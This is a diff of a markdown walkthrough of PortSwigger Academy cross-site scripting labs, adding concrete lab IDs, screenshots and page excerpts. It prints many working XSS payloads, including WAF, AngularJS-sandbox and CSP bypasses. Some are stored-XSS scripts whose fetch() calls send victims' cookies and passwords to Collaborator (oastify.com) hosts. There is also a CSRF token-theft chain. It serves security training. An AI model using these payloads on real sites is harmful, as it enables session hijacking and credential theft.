@@ -249,13 +249,40 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 ### Proof of concept
 
 1. On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.
-2. Add a `storeId` query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
-3. In the browser, notice that the random string is now listed as one of the options in the drop-down list.
-4. Right-click and inspect the drop-down list to confirm that the value of the storeId parameter has been placed inside a select element. 
-5. Create a suitable XSS payload inside the storeId parameter:
 
 ```text
-product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
+<form id="stockCheckForm" action="/product/stock" method="POST">
+    <input required type="hidden" name="productId" value="4">
+    <script>
+        var stores = ["London","Paris","Milan"];
+        var store = (new URLSearchParams(window.location.search)).get('storeId');
+        document.write('<select name="storeId">');
+        if(store) {
+            document.write('<option selected>'+store+'</option>');
+        }
+        for(var i=0;i<stores.length;i++) {
+            if(stores[i] === store) {
+                continue;
+            }
+            document.write('<option>'+stores[i]+'</option>');
+        }
+        document.write('</select>');
+    </script>
+    <button type="submit" class="button">Check stock</button>
+</form>
+```
+2. Add a `storeId` query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
+
+```text
+https://0a07003f04c9eae2c0c9af0b0027005f.web-security-academy.net/product?productId=4&storeId=abcdef
+```
+
+3. In the browser, the random string is now listed as one of the options in the drop-down list.
+4. Right-click and inspect the drop-down list to confirm that the value of the storeId parameter has been placed inside a select element. 
+5. Create a suitable XSS payload inside the `storeId` parameter:
+
+```text
+https://0a07003f04c9eae2c0c9af0b0027005f.web-security-academy.net/product?productId=4&storeId=<script>alert(0)</script>
 ```
 
 ----
@@ -272,6 +299,13 @@ AngularJS is a popular JavaScript library, which scans the contents of HTML node
 
 1. Enter an alphanumeric string into the search box.
 2. View the page source and observe that your random string is enclosed in an `ng-app` directive.
+
+```text
+<body ng-app="" class="ng-scope">
+...
+</body>
+```
+
 3. Enter the following AngularJS expression in the search box:
 
 ```text
@@ -294,9 +328,34 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 2. Go to the target website and use the search bar to search for a random test string.
 3. In the Proxy tool forward the request.
 4. On the Intercept tab, notice that the string is reflected in a JSON response called `search-results`.
+
+![XSS](../../_static/images/xss1.png)
+
+```text
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 33
+
+{"results":[],"searchTerm":"XSS"}
+```
+
 5. From the Site Map, open the `searchResults.js` file and notice that the JSON response is used with an `eval()` function call.
+
+```text
+function search(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            eval('var searchResultsObj = ' + this.responseText);
+            displaySearchResults(searchResultsObj);
+        }
+    };
+    ...
+}
+```
 6. Experiment with different search strings. The JSON response is escaping quotation marks. And backslash is not being escaped.
-7. Inject:
+7. Inject payload:
 
 ```text
 \"-alert(1)}//
@@ -304,7 +363,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
     
 When the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.
 
-An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated:
+An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the `alert()` function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated:
 
 ```text
 {"searchTerm":"\\"-alert(1)}//", "results":[]} 
@@ -320,7 +379,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ### Proof of concept
 
-1.  Post a comment containing the following vector:
+1.  Use a comment with the vector:
 
 ```text
 <><img src=1 onerror=alert(1)>
@@ -337,12 +396,12 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 ### Proof of concept
 
 1. Using Burp Suite Professional, go to the Collaborator tab.
-2. Click **Copy to clipboard** to copy a unique Burp Collaborator payload to your clipboard.
+2. Click **Copy to clipboard** to copy a unique Burp Collaborator payload to the clipboard.
 3. Submit the payload in a blog comment, inserting your Burp Collaborator subdomain where indicated. This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
 
 ```text
 <script>
-    fetch('https://burp-collab-subdomain', {
+    fetch('https://kocnw0mrbkcqli3hz8v75eaoofu6iw6l.oastify.com', {
     method: 'POST',
     mode: 'no-cors',
     body:document.cookie
@@ -350,15 +409,24 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 </script>
 ```
 
+The request contains
+
+```text
+csrf=v2vsUOVw1AzS5JTcIE0gfOxlGpqzwju5&postId=10&comment=%3Cscript%3E%0D%0A++++fetch%28%27https%3A%2F%2Fkocnw0mrbkcqli3hz8v75eaoofu6iw6l.oastify.com%27%2C+%7B%0D%0A++++method%3A+%27POST%27%2C%0D%0A++++mode%3A+%27no-cors%27%2C%0D%0A++++body%3Adocument.cookie%0D%0A++++%7D%29%3B%0D%0A%3C%2Fscript%3E&name=Evil&email=evil%40doer.com&website=
+```
+
 4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
 5. Take a note of the value of the victim's cookie in the POST body.
+
+![XSS](../../_static/images/xss2.png)
+
 6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.
 
 ### Exploitability
 
-To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator's default public server, meaning Burp Pro.
 
-And there is an alternative solution to this lab that does not require Burp Collaborator: Make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. This exposes the cookie publicly, and discloses evidence that the attack was performed. So a C2 and the above solution would be better. Working on it.
+And there is an alternative solution to this lab that does not require Burp Collaborator: Make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. This exposes the cookie publicly, and discloses evidence that the attack was performed. 
 
 ----
 
@@ -366,7 +434,7 @@ And there is an alternative solution to this lab that does not require Burp Coll
 
 ### Description
 
-The website in [this lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords) contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted.
+The website in [this lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords) contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. 
 
 ### Proof of concept
 
@@ -376,7 +444,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ```text
 <input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('https://burp-collab-subdomain',{
+<input type=password name=password onchange="if(this.value.length)fetch('https://dyfm57w738b9ce3s2hdcovtg177yvojd.oastify.com',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
@@ -386,11 +454,14 @@ This script will make anyone who views the comment issue a POST request containi
 
 4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
 5. Take a note of the value of the victim's username and password in the POST body.
-6. Use the credentials to log in as the victim user.
+
+![XSS](../../_static/images/xss3.png)
+
+6. Use the credentials to log in as the administrator user.
 
 ### Exploitability
 
-To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator's default public server.
 
 And there is an alternative solution to this lab that does not require Burp Collaborator: adapt the attack to make the victim post their credentials within a blog comment by exploiting the XSS to perform CSRF. This is far less subtle because it exposes the username and password publicly, and also discloses evidence that the attack was performed. 
 
@@ -436,23 +507,29 @@ This will make anyone who views the comment issue a POST request to change their
 
 ### Description
 
-The website in [this lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked) contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. 
+The website in [this lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked) contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. Use the [XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 ### Proof of concept
 
-1. Inject a standard XSS vector, such as:
+1. Inject a standard XSS vector in the search box, and intercept:
 
 ```text
 <img src=1 onerror=print()>
 ```
 
-2. Observe that this gets blocked. In the next steps, use Burp Intruder to test which tags and attributes are being blocked.
-3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
-4. In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: `<>`
-5. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`
-6. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".
+![XSS](../../_static/images/xss4.png)
+
+It gets blocked. Test which tags and attributes are being blocked:
+
+2. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
+3. In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: `<>`
+4. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`
+6. Go to the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".
 7. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
 8. When the attack is finished, review the results. Note that all payloads caused an HTTP `400` response, except for the body payload, which caused a `200` response.
+
+![XSS](../../_static/images/xss5.png)
+
 9. Go back to the Positions tab in Burp Intruder and replace the search term with:
 
 ```text
@@ -460,14 +537,19 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 ```
 
 10. Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<body%20§§=1>`
-11. Visit the XSS cheat sheet and click "copy events to clipboard". 
+11. Visit the XSS cheat sheet again and click "Copy events to clipboard". 
 12. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack". 
 13. When the attack is finished, review the results. Note that all payloads caused an HTTP `400` response, except for the `onresize` payload, which caused a `200` response. 
-14. Go to the exploit server and paste the following code, replacing `lab-id` with your lab ID:
+
+![XSS](../../_static/images/xss6.png)
+
+14. Go to the exploit server and paste the following code, replacing `0aa900f60364bf3ec1f908fa00dc005a` with your lab ID:
  
 ```text
-<iframe src="https://lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+<iframe src="https://0aa900f60364bf3ec1f908fa00dc005a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
+
+![XSS](../../_static/images/xss7.png)
 
 15. Click **Store** and **Deliver exploit to victim**.
 
@@ -488,6 +570,8 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
     location = 'https://lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 </script>
 ```
+
+![XSS](../../_static/images/xss8.png)
     
 2. Click **Store** and **Deliver exploit to victim**.
 
@@ -503,7 +587,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ### Proof of concept
 
-1. Inject a standard XSS payload:
+1. Inject a standard XSS payload in the search box:
 
 ```text
 <img src=1 onerror=alert(1)>
@@ -516,7 +600,10 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 6. Place the cursor between the angle brackets and click "Add §" twice to create a payload position. The value of the search term should now be: `<§§>`
 7. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".
 8. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
-9. When the attack is finished, review the results. Observe that all payloads caused an HTTP `400` response, except for the ones using the `svg`, `animatetransform`, `title`, and `image` tags, which received a `200` response.
+9. When the attack is finished, review the results. All payloads caused an HTTP `400` response, except for the ones using the `svg`, `animatetransform`, `title`, and `image` tags, which received a `200` response.
+
+![XSS](../../_static/images/xss9.png)
+
 10. Go back to the Positions tab in Burp Intruder and replace the search term with:
 
 ```text
@@ -532,10 +619,13 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 12. Visit the XSS cheat sheet and click "Copy events to clipboard".
 13. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
 14. When the attack is finished, review the results. Note that all payloads caused an HTTP `400` response, except for the `onbegin` payload, which caused a `200` response.
-15. Visit the following URL in the browser to confirm that the `alert()` function is called and the lab is solved:
+
+![XSS](../../_static/images/xss10.png)
+
+15. Post the following URL in the browser to confirm that the `alert()` function is called and the lab is solved:
 
 ```text
-https://lab-id.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+https://0ad000a004968e0fc04c4fee006d000c.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
 ```
 
 ----
@@ -551,7 +641,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 1. Visit the following URL, replacing `lab-id` with your lab ID:
  
 ```text
-https://lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+https://0a8e007b03ebd129c06bf93500c800bd.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
 ```
 
 This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called.
@@ -617,6 +707,13 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
 2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
 3. Note the random string in the second Repeater tab has been reflected inside an `onclick` event handler attribute.
+
+```text
+<p>
+<img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://whatever" onclick="var tracker={track(){}};tracker.track('http://whatever');">Oi</a> | 26 January 2023
+</p>
+```
+
 4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload:
 
 ```text
@@ -637,6 +734,14 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Enter a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
 2. Note the random string has been reflected inside a JavaScript template string.
+
+```text
+<script>
+    var message = `0 search results for 'abcdef'`;
+    document.getElementById('searchMessage').innerText = message;
+</script>
+```
+
 3. Replace the input with the following payload to execute JavaScript inside the template string:
 
 ```text
@@ -655,10 +760,10 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ### Proof of concept
 
-1. Visit the following URL, replacing `lab-id` with your lab ID:
+1. Visit the following URL, replacing `0aea002d04f460bbc1d2491e00ad00da` with your lab ID:
 
 ```text
-https://lab-id.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+https://0aea002d04f460bbc1d2491e00ad00da.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
 ```
 
 ----
@@ -671,13 +776,15 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ### Proof of concept
 
-1. Visit the following URL, replacing lab-id with your lab ID:
+1. Visit the following URL, replacing `0a3300f80431576bc1cf0dee00110099` with your lab ID:
 
 ```text
-https://lab-id.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+https://0a3300f80431576bc1cf0dee00110099.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
 ```
 
 2. Click "Back to blog" at the bottom of the page.
+
+![XSS](../../_static/images/xss11.png)
 
 The exploit uses exception handling to call the alert function with arguments. The `throw` statement is used, separated with a blank comment in order to get round the no spaces restriction. The `alert` function is assigned to the `onerror` exception handler.
 
@@ -693,10 +800,10 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ### Proof of concept
 
-1. Visit the following URL, replacing `lab-id` with your lab ID:
+1. Visit the following URL, replacing `0ae600ec04b3716dc12345280056003b` with your lab ID:
 
 ```text
-https://lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+https://0ae600ec04b3716dc12345280056003b.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
 
 The exploit uses `toString()` to create a string without using quotes. It then gets the String prototype and overwrites the `charAt` function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the `orderBy` filter. We then set the argument for the filter by again using `toString()` to create a string and the String constructor property. Finally, we use the `fromCharCode` method to generate the payload by converting character codes into the string `x=alert(1)`. Because the `charAt` function has been overwritten, AngularJS will allow this code where normally it would not.
@@ -711,11 +818,19 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ### Proof of concept
 
-1. Go to the exploit server and paste the following code, replacing `lab-id` with your lab ID:
+1. Go to the exploit server and paste the following code, replacing `0a5a009b039d93c0c0374b3300ea00c7` with your lab ID:
 
 ```text
 <script>
-location='https://lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+location='https://0a5a009b039d93c0c0374b3300ea00c7.web-security-academy.net/?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x';
+</script>
+```
+
+URL encoded:
+
+```text
+<script>
+location="https://0a5a009b039d93c0c0374b3300ea00c7.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x";
 </script>
 ```
 
@@ -753,13 +868,26 @@ if(window.name) {
 
 6. Click **Store** and then **Deliver exploit to victim**. When the user visits the website containing this malicious script, if they click on the "Click me" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using the Burp Collaborator client.
 7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
+
+```text
+gO5FXqB3x1YvlTNGh9o0BXK2TumhZF4H
+```
 8. With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.
-9. In Burp, go to the intercepted request and change the value of the email parameter to `hacker@evil-user.net`.
+9. In Burp, go to the intercepted request and change the value of the email parameter to `hacker@evil-user.net`:
+
+![XSS](../../_static/images/xss12.png)
+
 10. Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.
+
+![XSS](../../_static/images/xss13.png)
+
 11. Click "Options" and make sure that the "Include auto-submit script" is activated.
 12. Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
 14. Drop the request and switch off the intercept feature.
 15. Go back to the exploit server and paste the CSRF HTML into the body. Overwrite the script that entered earlier.
+
+![XSS](../../_static/images/xss14.png)
+
 16. Click **Store** and **Deliver exploit to victim**. The user's email will be changed to `hacker@evil-user.net`.
 
 ### Exploitability
@@ -784,10 +912,15 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 2. Note the payload is reflected, but the CSP prevents the script from executing.
 3. In Burp Proxy, observe that the response contains a `Content-Security-Policy` header, and the `report-uri` directive contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy.
-4. Visit the following URL, replacing `lab-id` with your lab ID:
 
 ```text
-https://lab-id.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+```
+
+4. Visit the following URL, replacing `0a87000e04aa4aacc0a72cd800b1007d` with your lab ID:
+
+```text
+https://0a87000e04aa4aacc0a72cd800b1007d.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
 ```
 
 The injection uses the `script-src-elem` directive in CSP. This directive allows for targeting just script elements. Using this directive, it is possible to overwrite existing `script-src` rules enabling `unsafe-inline` injections, which allows for using inline scripts.
